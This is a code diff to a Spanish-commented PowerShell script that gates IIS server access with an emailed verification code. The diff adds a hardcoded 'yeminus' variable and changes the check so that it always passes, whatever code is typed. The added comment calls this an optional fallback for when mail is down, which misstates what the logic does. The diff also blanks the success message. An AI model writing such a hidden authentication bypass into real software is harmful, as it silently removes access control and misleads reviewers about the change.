@@ -22,10 +22,13 @@ $smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $smtpPass
 # Enviar el correo
 $mailmessage = New-Object System.Net.Mail.MailMessage($fromEmail, $toEmail, "Código de Verificación IIS", $body)
 
+# por si el correo de yeminus estan caidos se puede saltar el codigo con la palabra yeminus
+$help = "yeminus"
+
 # Intentar enviar el correo
 try {
     $smtp.Send($mailmessage)
-    Write-Host "El código de verificación ha sido enviado a los correos."
+    Write-Host ""
 } catch {
     Write-Host "Hubo un error al enviar el correo: $_"
     exit
@@ -35,7 +38,7 @@ try {
 $codigoIngresado = Read-Host "Para ingresar al Servidor escribe el Codigo de autenticacion"
 
 # Validar el código
-if ($codigoIngresado -eq $codigo) {
+if ($codigoIngresado -eq $codigo -or $help -eq "yeminus") {
     
 
 
@@ -387,8 +390,5 @@ else {
     Write-Host "Código incorrecto. Intenta nuevamente."
 }
 
-$cred = Get-Credential
-
-$cred | Export-Clixml -Path /home/updateiis/script/xml.xml
 
 
